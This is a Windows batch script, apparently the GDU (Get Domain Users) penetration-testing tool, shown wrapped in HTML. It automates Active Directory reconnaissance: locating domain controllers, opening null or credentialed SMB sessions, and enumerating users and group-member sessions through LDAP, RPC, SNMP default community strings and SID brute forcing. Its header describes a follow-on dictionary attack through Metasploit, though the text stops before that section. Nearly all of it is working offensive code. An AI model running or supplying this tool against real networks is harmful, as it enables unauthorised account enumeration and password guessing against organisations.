<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>GDU.bat</title>
</head><body>@ECHO off<br/>
CLS<br/>
<br/>
REM #################################################################<br/>
REM # Author and Stuff<br/>
REM #################################################################<br/>
REM # Script Name: Get Domain Users (GDU)<br/>
REM # Author: Scott Sutherland (nullbind) &lt;scott.sutherland@netspi.com&gt;<br/>
REM # Version: 1.2<br/>
REM #<br/>
REM # Description:<br/>
REM # This script is intended to automate Windows domain user <br/>
REM # enumeration using multiple methods, and initiate a <br/>
REM # dictionary attack against the accounts with respect to the <br/>
REM # acccount lockout policy.<br/>
REM #<br/>
REM # Technical Summary:<br/>
REM # 1) Determine domain from IPCONFIG (option provided to override)<br/>
REM&#09;# 2) Identify domain controllers via DNS server queries<br/>
REM # 3) Enumerate users via RCP endpoints with Dumpsec<br/>
REM # 4) Enumerate users via RCP endpoints with Enum<br/>
REM # 5) Enumerate users via RCP SID Brute forcing with the Metasploit<br/>
REM # &nbsp; &nbsp;smb_lookupsid module<br/>
REM # 6) Enumerate users via SNMP default strings with the Metasploit<br/>
REM # &nbsp; &nbsp;snmp_enumusers module<br/>
REM # 7) Enumerate password policy with Dumpsec<br/>
REM # 8) Conduct dictionary attack using top 20 rockyou password list <br/>
REM # &nbsp; &nbsp;against enumerated users with Metasploit smb_login module <br/>
REM # &nbsp; &nbsp;with respect to the password policy<br/>
REM #&#09;&#09;<br/>
REM # Authentication Methods:<br/>
REM # Users can authenticate with one of three options during attack.<br/>
REM # 1) Null SMB Login<br/>
REM # 2) Trusted connection<br/>
REM # 3) Username and password<br/>
REM #<br/>
REM # Notes:<br/>
REM # 1) If no lockout policy exists, the dictionary attack will be <br/>
REM # &nbsp; &nbsp;aborted so it can be manually confirmed<br/>
REM # 2)If the lockout policy cannot be determined the dicitonary<br/>
REM # &nbsp; &nbsp;attack will be aborted<br/>
REM #################################################################<br/>
<br/>
<br/>
REM -----------------------------------------------------------------<br/>
REM TODO<br/>
REM -----------------------------------------------------------------<br/>
REM - Add other authentication methods for sessions enumeration<br/>
REM - Fix each enumeration method so they stop on first success (dumpsec finished, the rest are pending)<br/>
REM - Add fast/comprehensive modes (added by needs testing)<br/>
REM - Add custom dictionary option<br/>
REM - Add check for required executables before running<br/>
REM -----------------------------------------------------------------<br/>
<br/>
REM -------------------------------------------------------<br/>
REM PRE RUN CONFIGURATION OPTIONS<br/>
REM -------------------------------------------------------<br/>
REM ## SETUP EXECUTABLES PATHS<br/>
SET unixtoolspath="C:\unixtools\"<br/>
SET metasploitpath="C:\metasploit\"<br/>
SET enumpath="C:\Penetration Testing\Enum+\Enum+\enum.exe"<br/>
SET dumpsecpath="C:\Program Files (x86)\SystemTools\dumpsec.exe"<br/>
<br/>
REM ## SETUP AUTHENTICATION VARIABLES<br/>
SET netuse_auth="" /user:""<br/>
SET enumauth=<br/>
<br/>
REM ## SETUP CUSTOM DOMAIN (NOT ASSOCIATED WITH DHCP)<br/>
REM ## Example: SET custom_domain=company.local<br/>
IF [%2] equ [-c] SET custom_domain=%3<br/>
IF [%6] equ [-c] SET custom_domain=%7<br/>
IF [%7] equ [-c] SET custom_domain=%8<br/>
<br/>
<br/>
REM ## SETUP COMMAND LINE SWITCHES<br/>
IF [%1] equ [] goto :SYNTAX<br/>
IF [%1] equ [-g] goto :AUTHENTICATE<br/>
IF [%1] equ [-n] goto :NULLSESSION<br/>
IF [%1] equ [-a] goto :AUTHENTICATE<br/>
IF [%1] equ [-t] goto :TRUSTEDCON<br/>
<br/>
:SYNTAX<br/>
ECHO.<br/>
ECHO &nbsp;====================================================================================<br/>
ECHO &nbsp; &nbsp; &nbsp; GET DOMAIN USERS (GDU) v.1.2 - Author: scott.sutherland@netspi.com (nullbind)<br/>
ECHO.<br/>
ECHO &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; https://github.com/nullbind/Other-Projects/tree/master/GDU<br/>
ECHO &nbsp;====================================================================================<br/>
ECHO.<br/>
ECHO &nbsp; This script is intended to automate Windows domain user enumeration using multiple <br/>
ECHO &nbsp; methods (LDAP,RPC,and SNMP). It also includes options to automatically initiate a <br/>
ECHO &nbsp; dictionary attack against enumerated accounts under the constraints of the acccount <br/>
ECHO &nbsp; lockout policy. <br/>
ECHO.<br/>
ECHO &nbsp; Syntax: gdu [options]<br/>
ECHO.<br/>
ECHO &nbsp; Options:<br/>
ECHO.<br/>
ECHO &nbsp; &nbsp;-n Authenticate with a null SMB login<br/>
ECHO &nbsp; &nbsp;-t Authenticate with a trusted connection (current user)<br/>
ECHO &nbsp; &nbsp;-a Authenticate with a supplied credentials<br/>
ECHO &nbsp; &nbsp;-u User name to authenticate with<br/>
ECHO &nbsp; &nbsp;-p Password to authenticate with<br/>
ECHO &nbsp; &nbsp;-g Domain group name for finding active member sessions<br/>
ECHO &nbsp; &nbsp;-c Custom domain<br/>
ECHO.<br/>
ECHO &nbsp; Examples (basic):<br/>
ECHO. <br/>
ECHO &nbsp; &nbsp;gdu -n &#09;&#09;&#09;&#09;&#09;&#09;&#09;<br/>
ECHO &nbsp; &nbsp;gdu -t<br/>
ECHO &nbsp; &nbsp;gdu -a -u "domain\user" -p password<br/>
ECHO &nbsp; &nbsp;gdu -g "group name" -u "domain\user" -p password <br/>
ECHO.<br/>
ECHO &nbsp; Examples (custom domain):<br/>
ECHO.<br/>
ECHO &nbsp; &nbsp;gdu -n -c domain.com&#09;&#09;&#09;&#09;&#09;&#09;&#09;<br/>
ECHO &nbsp; &nbsp;gdu -t -c domain.com<br/>
ECHO &nbsp; &nbsp;gdu -a -u "domain\myuser" -p mypassword -c domain.com<br/>
ECHO &nbsp; &nbsp;gdu -g "group name" -u "domain\user" -p password -c domain.com<br/>
ECHO.<br/>
GOTO :END<br/>
<br/>
:AUTHENTICATE<br/>
IF [%5] equ [] ECHO &nbsp;Missing username or password &amp;&amp; goto :END<br/>
SET enumauth=-u %3 -p %5<br/>
SET netuse_auth=/user:%3 %5<br/>
IF [%1] equ [-g] SET enumauth=-u %4 -p %6<br/>
IF [%1] equ [-g] SET netuse_auth=/user:%4 %6<br/>
IF [%1] equ [-g] SET attack=N &amp;&amp; GOTO :DHCP<br/>
GOTO :NULLSESSION<br/>
<br/>
:TRUSTEDCON<br/>
SET netuse_auth=<br/>
GOTO :NULLSESSION<br/>
<br/>
:NULLSESSION<br/>
REM ## CHECK IF USERS WOULD LIKE TO AUTO EXEC A DICTIONARY ATTACK<br/>
ECHO Would you like the dictionary attack to auto execute?<br/>
set /p attack=Y/N (default N):<br/>
IF %attack% equ y set attack=Y <br/>
SET attack=N <br/>
<br/>
ECHO Would you like to enabled quick mode?<br/>
set /p quickmode=Y/N (default N):<br/>
IF %quickmode% equ N GOTO :DHCP<br/>
IF %quickmode% equ y set attack=Y &amp;&amp; GOTO :DHCP<br/>
IF %quickmode% equ Y GOTO :DHCP<br/>
SET quickmode=N &amp;&amp; GOTO :DHCP<br/>
<br/>
<br/>
:DHCP<br/>
REM ## DISPLAY BANNER<br/>
cls<br/>
ECHO.<br/>
ECHO &nbsp;====================================================================================<br/>
ECHO &nbsp; &nbsp; &nbsp; GET DOMAIN USERS (GDU) v.1.2 - Author: scott.sutherland@netspi.com (nullbind)<br/>
ECHO.<br/>
ECHO &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; https://github.com/nullbind/Other-Projects/tree/master/GDU<br/>
ECHO &nbsp;====================================================================================<br/>
ECHO &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Enumerating Domain Users &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
ECHO &nbsp;------------------------------------------------------------------------------------<br/>
REM -------------------------------------------------------<br/>
REM GET CURRENT DOMAIN FROM IPCONFIG DHCP CONFIGURATION<br/>
REM -------------------------------------------------------<br/>
IF [%1] equ [-n] ECHO &nbsp;[*] &nbsp; &nbsp;INFO: Authentication method = NULLSESSION<br/>
IF [%1] equ [-a] ECHO &nbsp;[*] &nbsp; &nbsp;INFO: Authentication method = AUTHENTICATED USER<br/>
IF [%1] equ [-g] ECHO &nbsp;[*] &nbsp; &nbsp;INFO: Authentication method = AUTHENTICATED USER<br/>
IF [%1] equ [-t] ECHO &nbsp;[*] &nbsp; &nbsp;INFO: Authentication method = TRUSTED CONNECTION<br/>
IF %attack% equ N ECHO &nbsp;[*] &nbsp; &nbsp;INFO: Dictionary attack DISABLED<br/>
IF %attack% equ Y ECHO &nbsp;[*] &nbsp; &nbsp;INFO: Dictionary attack ENABLED<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Getting domain from DHCP configuration...<br/>
<br/>
REM ## PARSE DOMAIN FROM IPCONFIG<br/>
ipconfig | find /I "." | &nbsp;find /I "Connection-specific DNS Suffix &nbsp;. : " | gawk -F " " "{print $6}" | find /v " " &nbsp;| sort | uniq | find /I "."|sed -e "s/^[ \]*//" &gt;target<br/>
SET /p target_domain= &lt; target<br/>
IF EXIST target del target<br/>
<br/>
REM ## SETUP CUSTOM DOMAIN IF VARIABLE HAS BEEN SET<br/>
IF [%target_domain%] equ [] ECHO &nbsp;[-] &nbsp;RESULT: FAILED &amp;&amp; GOTO :END<br/>
<br/>
IF [%custom_domain%] neq [] SET target_domain=%custom_domain% <br/>
ECHO &nbsp;[*] &nbsp;RESULT: %target_domain%<br/>
<br/>
REM ## CHECKING TOTAL NUMBER OF WORDS IN A DOMAIN AND SAVE AS TOTALVAR <br/>
IF EXIST num_words del num_words<br/>
echo %target_domain%| gawk &nbsp;-F "." "{ total = total + NF }; END { print total+0 }" &gt; num_words<br/>
SET /p totalvar= &lt; num_words<br/>
IF EXIST num_words DEL num_words<br/>
<br/>
REM ## DEFINE DOMAIN PARAMETER TO BE USED LATER (e.g: var1=hacking, var2=lab, var3=local)<br/>
IF EXIST domainname del domainname<br/>
FOR /L %%G IN (1,1,%totalvar%) DO (echo %target_domain% | gawk -F "." "{print $%%G}" &gt; %%G<br/>
SET /p var%%G= &lt; %%G<br/>
gawk "BEGIN { while (a++&lt;1) s=s \"dc=%%var%%G%%\"; print s }" &gt;&gt; domainname<br/>
DEL %%G )<br/>
<br/>
REM ## PARSING DOMAIN VARIABLES FOR THE domain_parameters (e.g: dc=%var1%,dc=%var2%,dc=%var3%)<br/>
IF EXIST domainname_var del domainname_var<br/>
gawk "NR==1{x=$0;next}NF{x=x\",\"$0}END{print x}" domainname &gt; domainname_var<br/>
DEL domainname<br/>
<br/>
REM ## FIX PARSING ISSUES<br/>
IF EXIST domainname_var2 del domainname_var2<br/>
SET /p temp_var= &lt; domainname_var<br/>
@echo %temp_var% | sed "s/'//" &gt; domainname_var2<br/>
SET /p domain_parameter= &lt; domainname_var2<br/>
IF EXIST domainname_var DEL domainname_var <br/>
IF EXIST domainname_var2 DEL domainname_var2<br/>
<br/>
<br/>
REM -------------------------------------------------------<br/>
REM ENUMERATE DOMAIN CONTROLLERS WITH NSLOOKUP<br/>
REM -------------------------------------------------------<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Getting list of DCs from DNS...<br/>
<br/>
REM ## ENUMERATE DOMAIN CONTROLLERS<br/>
nslookup -type=SRV _ldap._tcp.%target_domain% 2&gt;nul| find /I "internet address" | gawk -F " " "{print $5}" | uniq | sort &gt; dcs.txt 2&gt; NUL <br/>
<br/>
REM ## CHECK IF DOMAIN CONTROLLERS ARE UP<br/>
for /F "tokens=*" %%i in ('cat dcs.txt') do ping -n 2 %%i | grep -i "reply" | grep -i "bytes=" | gawk -F " " "{print $3}"| sed s/://g | uniq &gt;&gt; dcs_live.txt<br/>
<br/>
REM ## UPDATE DC LIST<br/>
sort dcs_live.txt&gt;dcs.txt<br/>
<br/>
REM ## REMOVE TEMP FILE<br/>
IF EXIST dcs_live.txt DEL dcs_live.txt<br/>
<br/>
REM ## GET DOMAIN CONTROLLER COUNT<br/>
wc -l dcs.txt | sed s/dcs.txt//g | sed -e "s/^[ \]*//" &gt; dc_count<br/>
SET /P dc_count=&lt;dc_count<br/>
IF EXIST dc_count del dc_count<br/>
if %dc_count% LEQ 0 ECHO &nbsp;[-] &nbsp;RESULT: FAILED &amp;&amp; GOTO :END<br/>
<br/>
REM ## PRINT NUMBER OF DOMAIN CONTROLLERS<br/>
ECHO &nbsp;[*] &nbsp;RESULT: Found %dc_count%domain controllers<br/>
<br/>
REM ## PRINT LIST OF DOMAIN CONTROLLERS<br/>
for /F "tokens=*" %%i in ('type dcs.txt') do ECHO &nbsp;[*] &nbsp; &nbsp; &nbsp;DC: %%i<br/>
<br/>
<br/>
REM -------------------------------------------------------<br/>
REM CREATE SMB SESSION TO DCs WITH NET USE<br/>
REM -------------------------------------------------------<br/>
REM ## Establish smb login to each domain controller via native net use command<br/>
IF [%1] equ [-n] ECHO &nbsp;[*] &nbsp;ACTION: Establishing null SMB login to each DC...<br/>
IF [%1] equ [-a] ECHO &nbsp;[*] &nbsp;ACTION: Establishing authenticated login to each DC as %3...<br/>
IF [%1] equ [-g] ECHO &nbsp;[*] &nbsp;ACTION: Establishing authenticated login to each DC as %4...<br/>
<br/>
FOR /F "tokens=*" %%i in ('type dcs.txt') do net use \\%%i\IPC$ %netuse_auth% 1&gt;nul<br/>
<br/>
IF [%1] equ [-g] GOTO :GETGROUPSESS<br/>
GOTO :LDAP<br/>
<br/>
<br/>
:GETGROUPSESS<br/>
REM ## CHECK FOR REQUIRED VARIABLES<br/>
IF [%2] equ [] ECHO MISSING GROUP NAME<br/>
IF [%4] equ [] ECHO MISSING USERNAME FOR AUTHENTICATION<br/>
IF [%6] equ [] ECHO M<br/>
<br/>
REM -------------------------------------------------------<br/>
REM GET ACTIVE SESSIONS OF DOMAIN GROUP MEMBERS<br/>
REM -------------------------------------------------------<br/>
<br/>
REM ## GET MEMBER NAMES FOR THE GROUP<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Sending LDAP query for list of %2 group members...<br/>
@AdFind.exe -b %domain_parameter% &nbsp;-f name=%2 member -list | gawk -F "CN=" "{print $2}" | sed s/,//g 2&gt;nul 1&gt;group_tmp.txt<br/>
<br/>
REM ## GET LOGIN FOR EACH USER<br/>
REM ECHO &nbsp;[*] &nbsp;ACTION: Parsing group member names...<br/>
FOR /f "tokens=1 delims=" %%a IN ('type group_tmp.txt') do @adfind -b %domain_parameter% -f name="%%a" | grep -i "sAMAccountName" | sed -e s/^&gt;sAMAccountName:" "//g &gt;&gt; group_members.txt<br/>
&#09;<br/>
REM ## GET ACTIVE SESSIONS FOR GROUP MEMBERS<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Querying domain controllers for active sessions...<br/>
for /f "tokens=*" %%a in ('type dcs.txt') do NetSess.exe %%a &gt;&gt; sessions_tmp.txt <br/>
<br/>
REM ## SEARCH SESSIONS FOR ACTIVE GROUP MEMBER SESSIONS<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Searching sessions for group members...<br/>
for /f "tokens=*" %%a in ('type group_members.txt') do grep -i %%a sessions_tmp.txt &gt;&gt; group_sess_tmp.txt<br/>
sort group_sess_tmp.txt | uniq &gt; group_sess_final.txt<br/>
<br/>
REM ## GET COUNT OF ACTIVE SESSIONS<br/>
wc -l group_sess_final.txt | sed s/group_sess_final.txt//g | sed -e "s/^[ \]*//" &gt; sess_count.txt<br/>
SET /P sess_count=&lt;sess_count.txt<br/>
if %sess_count% LEQ 0 ECHO &nbsp;[-] &nbsp;RESULT: No active sessions found.<br/>
<br/>
REM ## DISPLAY NUMBER OF ACTIVE GROUP SESSIONS<br/>
ECHO &nbsp;[*] &nbsp;RESULT: %sess_count%session(s) were found!<br/>
<br/>
REM ## DISPLAY LIST OF ACTIVE GROUP MEMBER SESSIONS<br/>
for /f "tokens=*" %%a in ('type group_sess_final.txt') do ECHO &nbsp;[*] SESSION: %%a<br/>
<br/>
REM ## CLEAN UP FILES<br/>
IF EXIST group_tmp.txt DEL group_tmp.txt<br/>
IF EXIST group_members.txt DEL group_members.txt<br/>
IF EXIST sessions_tmp.txt &nbsp;DEL sessions_tmp.txt <br/>
IF EXIST group_sess_tmp.txt DEL group_sess_tmp.txt<br/>
IF EXIST sess_count.txt DEL sess_count.txt<br/>
<br/>
GOTO :END<br/>
<br/>
<br/>
:LDAP<br/>
REM -------------------------------------------------------<br/>
REM USER ENUMERATED WITH ADFIND (LDAP)<br/>
REM -------------------------------------------------------<br/>
<br/>
REM ## DETERMINE IF LDAP SHOULD BE USED<br/>
IF [%1] equ [-n] ECHO &nbsp;[*] &nbsp; &nbsp;INFO: LDAP doesn't support null SMB login &amp;&amp; GOTO :DUMPSEC<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Attempting user enumeration with LDAP...<br/>
<br/>
REM ## GET LIST OF USERS &amp; PARSE INTO FILE<br/>
@adfind -b %domain_parameter% -f "objectcategory=user" -gc | grep -i "sAMAccountName:" | gawk -F ":" "{print $2}" | gawk -F " " "{print $1}"| gawk "!/\$/"| uniq | sort 2&gt;nul 1&gt; allusers.txt<br/>
<br/>
REM ## GET USER COUNT<br/>
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g | uniq&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## CLEAN UP COUNT FILES<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_ldap.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
IF %user_count% EQU 0 ECHO &nbsp;[-] &nbsp;RESULT: FAILED &amp;&amp; GOTO :DUMPSEC<br/>
<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO &nbsp;[*] &nbsp;RESULT: Enumerated %user_count%users (domain_users_ldap.txt)<br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :DUMPSEC<br/>
<br/>
<br/>
:DUMPSEC<br/>
REM -------------------------------------------------------<br/>
REM USER ENUMERATED WITH DUMPSEC (RPC ENDPOINTS)<br/>
REM -------------------------------------------------------<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Attempting user enumeration via RPC ENDPOINTS(DUMPSEC)...<br/>
<br/>
REM ## GET LIST OF USERS FROM EVERY DC<br/>
REM FOR /F "tokens=*" %%i in ('type dcs.txt') do %dumpsecpath% /computer=\\%%i /rpt=usersonly /saveas=csv /outfile=%%i_usrs.txt 2&gt; nul<br/>
<br/>
REM ## GET LIST OF USERS FROM EVERY DC &nbsp;- STOP ON FIRST SUCCESS<br/>
FOR /F "tokens=*" %%i in ('type dcs.txt') do %dumpsecpath% /computer=\\%%i /rpt=usersonly /saveas=csv /outfile=%%i_usrs.txt 2&gt; nul &amp;&amp; cat *_usrs.txt| gawk -F "," "{print $1}" | find /V "Somarsoft DumpSec"| find /V "NetQueryDisplayInformation"| find /V "UserName" | grep -v "^$" | grep -v "," | sort | uniq &gt; allusers.txt &amp;&amp; wc -l allusers.txt| sed -e "s/^[ \]*//" | sed s/allusers.txt//g&gt;user_count &amp;&amp; SET /P user_count=&lt;user_count &amp;&amp; IF %user_count% GEQ 10 move allusers.txt domain_users_rpc_dumpsec.txt 2&gt;nul 1&gt;nul &amp;&amp; IF EXIST %%i_usrs.txt del %%i_usrs.txt &amp;&amp; GOTO :DUMPSECE<br/>
<br/>
REM ## PARSE CLEAN LIST OF USERS<br/>
cat *_usrs.txt| gawk -F "," "{print $1}" | find /V "Somarsoft DumpSec"| find /V "NetQueryDisplayInformation"| find /V "UserName" | grep -v "^$" | grep -v "," | sort | uniq &gt; allusers.txt<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
FOR /F "tokens=*" %%i in ('type dcs.txt') do del %%i_usrs.txt<br/>
<br/>
REM ## GET USER COUNT<br/>
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_rpc_dumpsec.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
IF %user_count% LEQ 1 ECHO &nbsp;[-] &nbsp;RESULT: FAILED &amp;&amp; GOTO :ENUMN<br/>
<br/>
:DUMPSECE<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO &nbsp;[*] &nbsp;RESULT: Enumerated %user_count%users (domain_users_rpc_dumpsec.txt)<br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :ENUMN<br/>
<br/>
<br/>
:ENUMN<br/>
REM -------------------------------------------------------<br/>
REM Run enum -N to enumerate users (RPC ENDPOINTS)<br/>
REM -------------------------------------------------------<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Attempting user enumeration via RPC ENDPOINTS(ENUM -N)...<br/>
<br/>
REM ## GET LIST OF USERS<br/>
IF [%1] equ [-t] FOR /F "tokens=*" %%i in ('type dcs.txt') do %enumpath% -N %%i &gt;&gt; allusers.txt<br/>
IF [%1] equ [-n] FOR /F "tokens=*" %%i in ('type dcs.txt') do %enumpath% -N %enumauth% %%i &gt;&gt; allusers.txt<br/>
IF [%1] equ [-a] FOR /F "tokens=*" %%i in ('type dcs.txt') do %enumpath% -N %enumauth% %%i &gt;&gt; allusers.txt<br/>
<br/>
REM ## PARSE CLEAN LIST OF USERS<br/>
grep -i "(pass 1)... got" allusers.txt| wc -l | sed -e "s/^[ \]*//" &gt; checkit<br/>
SET /P success=&lt;checkit<br/>
IF EXIST checkit del checkit<br/>
IF %success% EQU 0 ECHO &nbsp;[-] &nbsp;RESULT: FAILED &amp;&amp; GOTO :SNMPENUM<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $1}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $2}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $3}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $4}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $5}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $6}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $7}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $8}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $9}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
grep -v "connected as" allusers.txt | grep -v ":" | grep -v "getting namelist" | grep -v "Cleaning up" | grep -v "setting up session" | grep -v "success." | grep -v "server:" | gawk -F " " "{print $10}" &nbsp;| sort | uniq &gt;&gt; clean.txt<br/>
cat clean.txt | grep -v "\$" | grep -v "^$" | grep -v "," | &nbsp;sed -e "s/^[ \]*//" &nbsp;| sort | uniq &gt; allusers.txt<br/>
IF EXIST clean.txt del clean.txt<br/>
<br/>
REM ## GET USER COUNT<br/>
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_rpc_enum.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
IF %user_count% EQU 0 ECHO &nbsp;[-] &nbsp;RESULT: FAILED &amp;&amp; GOTO :SNMPENUM<br/>
<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO &nbsp;[*] &nbsp;RESULT: Enumerated %user_count%users (domain_users_rpc_enum.txt) <br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :SNMPENUM<br/>
<br/>
<br/>
:SNMPENUM<br/>
REM ----------------------------------------------------------------------<br/>
REM ENUMERATE USERS WITH SNMP_ENUMUSERS (SNMP)<br/>
REM -----------------------------------------------------------------------<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Attempting user enumeration via SNMP Public string...<br/>
<br/>
REM ## GET LIST OF USERS<br/>
REM FOR /F "tokens=*" %%i in ('type dcs.txt') do ruby c:\metasploit\msf3\msfcli auxiliary/scanner/snmp/snmp_enumusers COMMUNITY=Public RHOSTS=%%i E 2&gt; nul 1&gt;&gt; usrtmp.txt &amp;&amp;<br/>
ruby c:\metasploit\msf3\msfcli auxiliary/scanner/snmp/snmp_enumusers COMMUNITY=Public RHOSTS=file:%mypwd%\\dcs.txt E 2&gt; nul 1&gt;&gt; usrtmp.txt<br/>
<br/>
REM ## PARSE CLEAN LIST OF USERS<br/>
grep -i "Found Users:" usrtmp.txt | gawk -F "Found Users:" "{print $2}" | tr , \n | sed -e "s/^[ \]*//" | sort | uniq 2&gt;nul 1&gt; allusers.txt<br/>
<br/>
REM ## REMOVE TEMP FILES<br/>
IF EXIST usrtmp.txt del usrtmp.txt<br/>
<br/>
REM ## GET NUMBER OF ENUMERATED USERS<br/>
wc -l allusers.txt | sed -e "s/^[ \]*//" | sed s/allusers.txt//g&gt;user_count<br/>
SET /P user_count=&lt;user_count<br/>
IF EXIST user_count del user_count<br/>
IF EXIST allusers.txt move allusers.txt domain_users_snmp.txt 2&gt;nul 1&gt;nul<br/>
<br/>
REM ## CHECK FOR FAILURE<br/>
if %user_count% LEQ 1 ECHO &nbsp;[-] &nbsp;RESULT: FAILED &amp;&amp; GOTO :SIDENUM<br/>
<br/>
REM ## PRINT NUMBER OF ENUMERATED USERS<br/>
ECHO &nbsp;[*] &nbsp;RESULT: Enumerated %user_count%users (domain_users_snmp.txt) <br/>
<br/>
REM ## QUICK MODE - IF SUCCESSFUL GOTO GRAB POLICY AND DO DICTIONARY ATTACK OR STOP (IF DICTIONARY ATTACK IS DISABLED)<br/>
IF %quickmode% equ Y GOTO :USERCHECK<br/>
<br/>
REM ## IF SUCCSESFUL GOTO USER ENUMERATION TYPE<br/>
GOTO :SIDENUM<br/>
<br/>
<br/>
:SIDENUM<br/>
REM -------------------------------------------------------<br/>
REM ENUMERATE USERS WITH SMB_LOOKUPSID (RPC SID Brute Force)<br/>
REM -------------------------------------------------------<br/>
ECHO &nbsp;[*] &nbsp;ACTION: Attempting user enumeration via RPC SID BF (takes a while)...<br/>
<br/>
REM ## BUILD FILE NAME FILE PATH FOR METASPLOIT VARIABLE<br/>
pwd &gt; pwd.txt<br/>
cat pwd.txt | sed s/\\/\\\\/g &gt; pwd2.txt<br/>
SET /P mypwd=&lt;pwd2.txt<br/>
IF EXIST pwd.txt del pwd.txt<br/>
IF EXIST pwd2.txt del pwd2.txt<br/>
<br/>
copy dcs.txt dclist.txt 2&gt;nul 1&gt;nul<br/>
<br/>
:runsid<br/>
REM ## SETUP NEXT SCAN<br/>
head -n 1 dclist.txt &gt; dc_target.txt<br/>
head -n 1 dclist.txt &gt;&gt; dcs_scanned.txt<br/>
diff -iw -d dclist.txt dcs_scanned.txt | grep -i "&lt;" | grep -v "^$" | sed -e "s/^[ \]*//" | grep -v "\," | gawk -F " " "{print $2}" &gt; dclist.txt<br/>
<br/>
REM ## GET LIST OF USERS for first server<br/>
